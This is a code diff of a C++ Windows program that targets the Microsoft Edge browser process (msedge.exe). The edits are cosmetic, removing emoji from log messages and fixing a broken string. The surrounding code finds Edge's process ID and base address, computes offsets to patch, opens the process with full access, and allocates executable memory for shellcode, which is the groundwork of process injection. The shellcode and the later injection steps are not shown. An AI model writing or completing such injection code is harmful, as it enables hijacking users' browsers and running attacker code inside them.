@@ -98,13 +98,13 @@ uintptr_t GetModuleBaseAddress(DWORD pid, const char* moduleName) {
 
 int main() {
     uintptr_t Jmpoffset = 0x1A8AF7;
-    // Step 1: 🔎 Get PID
+    // Step 1: Get PID
     DWORD pid = FindProcessId(TARGET_PROCESS_NAME);
     if (!pid) {
         std::cerr << " msedge.exe not found.\n";
         return 1;
     }
-    std::cout << "🧬 PID of msedge.exe: " << pid << "\n";
+    std::cout << " PID of msedge.exe: " << pid << "\n";
 
     // Step 2: Get base address of msedge.exe
     uintptr_t baseAddress = GetModuleBaseAddress(pid, TARGET_PROCESS_NAME);
@@ -112,13 +112,13 @@ int main() {
         std::cerr << "Failed to get base address.\n";
         return 2;
     }
-    std::cout << "🏠 Base address of msedge.exe: 0x" << std::hex << baseAddress << "\n";
+    std::cout << " Base address of msedge.exe: 0x" << std::hex << baseAddress << "\n";
     uintptr_t JmpAddress = baseAddress + Jmpoffset;
     std::cout << "Jmp Address   : 0x" << std::hex << JmpAddress << std::endl;
 
     // Step 3: Calculate target dq address
     LPVOID patchAddr = (LPVOID)(baseAddress + DQ_OFFSET);
-    std::cout <<  DQ address to patch: 0x" << std::hex << (uintptr_t)patchAddr << "\n";
+    std::cout << " DQ address to patch: 0x" << std::hex << (uintptr_t)patchAddr << "\n";
 
     // Step 4: Open process
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
@@ -127,7 +127,7 @@ int main() {
         return 3;
     }
 
-    // Step 5: 💾 Allocate memory for shellcode
+    // Step 5:  Allocate memory for shellcode
     LPVOID remoteShellcode = VirtualAllocEx(hProc, nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteShellcode) {
         std::cerr << " Failed to allocate memory.\n";
